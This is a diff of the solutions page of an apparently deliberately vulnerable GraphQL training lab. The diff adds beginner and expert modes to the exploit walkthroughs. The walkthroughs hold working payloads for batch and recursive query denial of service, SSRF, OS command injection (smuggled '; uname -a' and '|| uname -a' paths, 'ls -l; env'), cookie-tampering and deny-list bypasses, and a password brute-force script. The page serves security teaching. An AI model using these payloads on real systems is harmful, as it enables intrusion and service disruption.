@@ -116,7 +116,7 @@
                 </div>
 
                 <div class="card-body">
-                <p><i><small><b>Note</b>: There may be more than one way to exploit any given vulnerability, the solutions demonstrated below aim to illustrate one way of achieving successful exploitation.</small></i></p>
+                <p><i><small><i class="fa fa-exclamation"></i> <b>Note</b>: There may be more than one way to exploit any given vulnerability, the solutions demonstrated below aim to illustrate one way of achieving successful exploitation.</small></i></p>
                 <br>
                 <!-- Start -->
                   <h3 style="color:purple" id="dos-batch"><b>Denial of Service :: Batch Query Attack</b></h3>
@@ -134,6 +134,8 @@
                   <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-dos-batch')">Show</button></h5>
                   <div id="sol-dos-batch" style="display:none">
                   <pre class="bash">
+# Beginner & Expert modes
+
 # We chain multiple resource intensive queries in an array and pass it to GraphQL
 data = [
   {"query":"query {\n  systemUpdate\n}","variables":[]},
@@ -161,6 +163,8 @@ requests.post('http://host/graphql', json=data)</pre>
                   <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-dos-recursion')">Show</button></h5>
                   <div style="display:none" id="sol-dos-recursion">
                   <pre class="bash">
+# Beginner & Expert modes
+
 query {
  pastes {
   owner {
@@ -211,6 +215,8 @@ query {
               <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-dos-intensive')">Show</button></h5>
               <div id="sol-dos-intensive" style="display:none">
               <pre class="bash">
+# Beginner & Expert modes
+
 # We measure the amount of time it takes a query to finish
 import time
 
@@ -244,27 +250,25 @@ print('Execution Time :: {} seconds'.format(end - start))
               <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-info-introspection')">Show</button></h5>
               <div id="sol-info-introspection" style="display:none">
               <pre class="bash">
-requests.post('http://host/graphql',
-                json={"query":"query IntrospectionQuery{__schema {queryType { name } mutationType { name } subscriptionType { name }}}"
-                }) # A full introspection query can be found here: https://gist.github.com/craigbeck/b90915d49fda19d5b2b17ead14dcd6da
+# Beginner mode
 
->>> Response:
-{
-  "data": {
-    "__schema": {
-      "queryType": {
-        "name": "Query"
-      },
-      "mutationType": {
-        "name": "Mutations"
-      },
-      "subscriptionType": null
+# Navigate to http://host/igraphql
+# Run Introspection query
+
+query {
+    __schema {
+      queryType { name }
+      mutationType { name }
+      subscriptionType { name }
     }
   }
 }
+
+# Expert mode
+
+1. Introspection is disabled, enumeration of fields and dynamic testing is required to under the structure of the application.
               </div>
               <!-- End -->
-
 
             <br>
               <!-- Start -->
@@ -280,7 +284,11 @@ requests.post('http://host/graphql',
               </ul>
               <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-info-igql')">Show</button></h5>
               <div id="sol-info-igql" style="display:none">
-              <pre class="bash">Browse to http://host/graphiql</pre>
+              <pre class="bash">
+# Beginner mode
+
+# Browse to http://host/graphiql
+</pre>
               </div>
               <!-- End -->
 
@@ -300,14 +308,14 @@ requests.post('http://host/graphql',
               <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-info-suggestions')">Show</button></h5>
               <div id="sol-info-suggestions" style="display:none">
               <pre class="bash">
+# Beginner and Expert modes
+
 # Supplying incorrect fields will trigger GraphQL to disclose fields with similar names
-
->>> Response:
-
 query {
   system
 }
 
+>>> Response:
 {
   "errors": [
     {
@@ -341,6 +349,8 @@ query {
               <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-info-ssrf')">Show</button></h5>
               <div id="sol-info-ssrf" style="display:none">
               <pre class="bash">
+# Beginner and Expert modes
+
 # Any arbitrary host and ports can be used to make an outbound HTTP request
 mutation {
   importPaste(host:"localhost", port:57130, path:"/", scheme:"http")
@@ -354,7 +364,7 @@ mutation {
             <h3 style="color:purple" id="exec-os-1"><b>Code Execution :: OS Command Injection #1</b></h3>
               <hr />
               <h5>Problem Statement</h5>
-              <p>The mutation <code>importPaste</code> allows escaping from the URI path parameter and introduce a UNIX command by chaining requests using <code>&&</code>. The GraphQL resolver does not allow characters such as <code>;</code>, <code>|</code> and <code>&</code> but not <code>&&</code>, and passes it directly into <code>cURL</code>.</p>
+              <p>The mutation <code>importPaste</code> allows escaping from the parameters and introduce a UNIX command by chaining commands. The GraphQL resolver does not sufficiently validate the input, and passes it directly into <code>cURL</code>.</p>
               <h5>Resources</h5>
               <ul>
                 <li><a href="https://owasp.org/www-community/attacks/Command_Injection" target="_blank"><i class="fa fa-newspaper"></i> OWASP - Command Injection</a></li>
@@ -362,10 +372,21 @@ mutation {
               <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-exec-os-1')">Show</button></h5>
               <div id="sol-exec-os-1" style="display:none">
               <pre class="bash">
-# Import Paste from URL filters a few key separators such as ";" "|", but not "&&"
+# Beginner mode
+
+# Import Paste allows specifying UNIX characters to break out of the URL provided to importPaste, using characters such as ";" "&&", "||", and more.
 query {
-  importPaste(host:"localhost", port:80, path:"/ && uname -a")
-}</pre>
+  importPaste(host:"localhost", port:80, path:"/ ; uname -a")
+}
+
+# Expert mode
+
+# Import Paste filters characters such as ";" and "&" but not "|", if you manage to cause the import to fail, you can double pipe it to a command that will execute in the context of the operating system.
+query {
+  importPaste(host:"hostthatdoesnotexist.com", port:80, path:"/ || uname -a")
+}
+
+</pre>
               </div>
               <!-- End -->
               <br>
@@ -373,7 +394,7 @@ query {
               <h3 style="color:purple" id="exec-os-2"><b>Code Execution :: OS Command Injection #2</b></h3>
               <hr />
               <h5>Problem Statement</h5>
-              <p>The query <code>systemDiagnostics</code> accepts certain UNIX binaries as parameters for debugging purposes, such as <code>whoami</code>, <code>ls</code>, <code>ps</code>, but the filtering can easily be bypassed by chaining commands together.</p>
+              <p>The query <code>systemDiagnostics</code> accepts certain UNIX binaries as parameters for debugging purposes, such as <code>whoami</code>, <code>ls</code>, <code>ps</code>, etc. However, it is protected with a username and password. After obtaining the <a href="http://127.0.0.1:5000/solutions#misc-weakpass">correct credentials</a>, the filtering can easily be bypassed by chaining commands together.</p>
               <h5>Resources</h5>
               <ul>
                 <li><a href="https://www.netsparker.com/blog/web-security/command-injection-vulnerability/" target="_blank"><i class="fa fa-newspaper"></i> Netsparker - Command Injection</a></li>
@@ -384,7 +405,7 @@ query {
 # System Diagnostics suffers from weak restricted shell implementation
 
 query {
-  systemDiagnostics(cmd:"id")
+  systemDiagnostics(username:"admin", password:"password", cmd:"id")
 }
 
 >>> Response:
@@ -397,7 +418,7 @@ query {
 
 
 query {
-  systemDiagnostics(cmd:"ls -l; env")
+  systemDiagnostics(username:"admin", password:"password", cmd:"ls -l; env")
 
 >>> Response:
 {
@@ -477,6 +498,8 @@ mutation {
               <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-brokenauthz-igql')">Show</button></h5>
               <div id="sol-brokenauthz-igql" style="display:none">
               <pre class="bash">
+# Beginner mode
+
 # Cookie 'env' stores a base64 encoded string with an instruction to disable graphiql. re-encoding with graphiql:enable bypasses the protection
 Z3JhcGhpcWw6ZGlzYWJsZQ==  - graphiql:disable
 
@@ -499,9 +522,8 @@ requests.post('http://host/graphiql',
                 <li>By defining a <b>deny-list</b>, the application server will have a "known bad" queries it will reject, and allow anything else.</li>
               </ul>
               <p>In general, the allow-list approach is easier to maintain and less error-prone, since we only allow certain things we trust. It does not mean it cannot have flaws too.</p>
-              <p>The application has a deny-list mechanism implemented that attempts to reject Introspection queries using <code>__schema</code> field and Health queries using the <code>systemHealth</code> query.
-              <p>The problem with this mechanism is that it's only preventing queries against the <code>/graphiql</code> endpoint, and not against <code>/graphql</code>.
-              The mechanism is also not taking into consideration the structure of queries, allowing a malicious user to bypass it.</p>
+              <p>The application has a deny-list mechanism implemented that attempts to reject Health queries using the <code>systemHealth</code> query.
+              <p>The problem with this mechanism is that it does not take into consideration queries can have <a href="https://graphql.org/learn/queries/#operation-name" target="_blank">operation names</a>.</p>
              <h5>Resources</h5>
               <ul>
                 <li><a href="https://www.apollographql.com/blog/securing-your-graphql-api-from-malicious-queries-16130a324a6b/" target="_blank"><i class="fa fa-newspaper"></i> Apollo - Securing your GraphQL From Malicious Queries </a></li>
@@ -510,30 +532,13 @@ requests.post('http://host/graphiql',
               <h5>Exploitation Solution <button class="reveal" onclick="reveal('sol-brokenauthz-denylist')">Show</button></h5>
               <div id="sol-brokenauthz-denylist" style="display:none">
               <pre class="bash">
-# Query systemHealth directly by calling /graphql
+# Expert mode
+
+# Query systemHealth directly by calling /graphql and supplying an arbitrary operation name.
 
 requests.post('http://host/graphql',
-              json={"query":"query {systemHealth}"})
+              json={"query":"query BypassMe{systemHealth}"})
 
-
-# Introspection query by constructing a different query format. Bypass it by providing additional fields:
-query {
- __schema {
-   types {
-     name
-     kind
-   }
- }
-}
-
-# or by omitting query keyword:
-{
-  __schema {
-    types {
-      name
-    }
-  }
-}
 </pre>
               </div>
               <!-- End -->
@@ -561,7 +566,7 @@ mutation {
               <!-- End -->
               <br>
 
-                    <!-- Start -->
+              <!-- Start -->
             <h3 style="color:purple" id="misc-weakpass"><b>Miscellaneous :: GraphQL Query Weak Password Protection</b></h3>
               <hr />
               <h5>Problem Statement</h5>
@@ -579,7 +584,7 @@ passwordlist = ['admin123', 'pass123', 'adminadmin', '123']
 
 for password in passwordlist:
   resp = requests.post('http://host/graphql',
-                      json={"query":"query {\n  systemDiagnostics(user:\"admin\", password:\"{}\", cmd:\"ls\")\n}".format(password),"variables":None})
+                      json={"query":"query {\n  systemDiagnostics(username:\"admin\", password:\"{}\", cmd:\"ls\")\n}".format(password),"variables":None})
   if not 'errors' in resp.text:
      print('Password is', password)
 
